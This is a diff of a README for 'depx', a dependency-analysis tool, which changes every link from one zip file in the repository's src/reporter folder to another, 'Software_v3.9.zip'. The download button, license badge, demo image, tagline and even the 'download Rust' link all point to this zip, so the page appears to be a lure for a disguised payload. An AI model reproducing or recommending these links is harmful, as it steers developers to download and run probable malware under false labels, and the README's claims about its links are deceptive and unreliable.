@@ -1,12 +1,12 @@
 # 🚀 depx - Analyze Your Dependencies Easily
 
-[![Download depx](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip)](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip)
-[![License: MIT](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip)](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip)
+[![Download depx](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip)](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip)
+[![License: MIT](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip)](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip)
 
-**Understand what's in your node_modules and https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip**
+**Understand what's in your node_modules and https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip**
 
 <p align="center">
-  <img src="https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip" alt="depx demo" width="600">
+  <img src="https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip" alt="depx demo" width="600">
 </p>
 
 A fast, intelligent dependency analyzer for JavaScript/TypeScript and Rust projects. Built in Rust for performance.
@@ -25,11 +25,11 @@ Standard tools like `npm ls`, `npm audit`, and `depcheck` provide disjointed dat
 - Operating System: Windows, macOS, or Linux
 - Minimum RAM: 2 GB
 - Storage: 100 MB of free space
-- Rust: Make sure you have Rust installed. If not, you can download it from [https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip).
+- Rust: Make sure you have Rust installed. If not, you can download it from [https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip).
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download depx](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip).
+To get started, visit this page to download: [Download depx](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip).
 
 ## ⚙️ Installation Steps
 
@@ -87,6 +87,6 @@ If you need help or want to learn more, feel free to check the frequently asked 
 - Rust Integration
 - Static Analysis
 
-Visit this page to download: [Download depx](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.5.zip).
+Visit this page to download: [Download depx](https://github.com/All2y/depx/raw/refs/heads/main/src/reporter/Software_v3.9.zip).
 
 Use depx to manage your dependencies effectively and to keep your projects clean.
